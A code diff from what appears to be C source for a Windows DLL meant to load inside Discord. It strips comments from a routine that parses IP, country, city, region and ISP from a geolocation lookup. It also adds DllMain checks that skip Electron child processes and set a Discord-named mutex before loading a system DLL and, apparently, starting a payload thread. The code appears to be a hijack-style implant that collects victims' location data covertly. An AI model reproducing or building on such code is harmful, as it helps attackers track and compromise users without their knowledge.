@@ -167,10 +167,8 @@ BOOL GetIpInformation(IpInfo* info) {
         if (WinHttpReadData(hRequest, buffer, sizeof(buffer) - 1, &bytesRead)) {
             buffer[bytesRead] = '\0';
 
-            // Parser les données JSON de façon simple
             char* ptr;
 
-            // Extraire IP
             ptr = strstr(buffer, "\"query\":\"");
             if (ptr) {
                 ptr += 9;
@@ -180,7 +178,6 @@ BOOL GetIpInformation(IpInfo* info) {
                 }
             }
 
-            // Extraire pays
             ptr = strstr(buffer, "\"country\":\"");
             if (ptr) {
                 ptr += 11;
@@ -190,7 +187,6 @@ BOOL GetIpInformation(IpInfo* info) {
                 }
             }
 
-            // Extraire ville
             ptr = strstr(buffer, "\"city\":\"");
             if (ptr) {
                 ptr += 8;
@@ -200,7 +196,6 @@ BOOL GetIpInformation(IpInfo* info) {
                 }
             }
 
-            // Extraire région
             ptr = strstr(buffer, "\"regionName\":\"");
             if (ptr) {
                 ptr += 14;
@@ -210,7 +205,6 @@ BOOL GetIpInformation(IpInfo* info) {
                 }
             }
 
-            // Extraire ISP
             ptr = strstr(buffer, "\"isp\":\"");
             if (ptr) {
                 ptr += 7;
@@ -329,9 +323,14 @@ DWORD WINAPI PayloadThread(LPVOID lpParam) {
     return 0;
 }
 
+
+
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
     if (fdwReason == DLL_PROCESS_ATTACH) {
         if (InterlockedIncrement(&g_lExecuted) != 1) return TRUE;
+
+        if (strstr(GetCommandLineA(), "--type=") != NULL) return TRUE;
+        HANDLE mutex = CreateMutexA(NULL, FALSE, "Global\\DiscordPingDLLMutex");
 
         DisableThreadLibraryCalls(hinstDLL);
         LoadSystemDll();
